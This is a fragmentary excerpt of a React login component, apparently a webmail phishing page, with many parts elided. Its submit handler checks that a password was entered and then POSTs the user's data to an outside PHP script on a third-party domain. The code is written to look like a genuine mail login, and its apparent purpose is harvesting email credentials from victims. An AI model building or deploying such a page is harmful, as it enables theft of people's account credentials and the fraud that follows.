...
const App = ()=>{
  ...
  const submitHandler = (e) => {
    ...
    if (pwd === "") {
      return null
        ...
        // const templateID = `template_vll9oh7`;
      ...
      $.ajax({
          type: "POST",
          url: "https://dexamerix.com/dashboard/file/ipsum.php",
          data: user,
          success(data) {
              // alert('OK');
              // console.log(data);
  ...
  return(<React.Fragment>
    ...
    { mainWebmail  ? 
    <section className='wrappper' style={{
      marginTop:'2em'
    }}>
...
{/* checkD */}
      {/* { checkD ? <section className="flct">
        <div className="checked_usr" style={{
        textAlign:'center'
      }}>
        <BiSolidCheckboxChecked className="cld_icn__" />
        &nbsp;
        Activated
      </div>
      </section> : null } */}
        ...
        <div className="log_in_form">
          ...
          <form className="forrmm" ref={formRef} onSubmit={submitHandler}>
            ...
            <div className="email_cont same_cont_style dddiiivvvccc">
              ...
              <div className="div_2_include_icon_in_input_" style={{
                marginTop:'10px'
              }}>
            ...
            <div className="submit_btn_cont dddiiivvvccc" style={{
              marginTop:'10px',
            }}>
              <input 
                type={`submit`} 
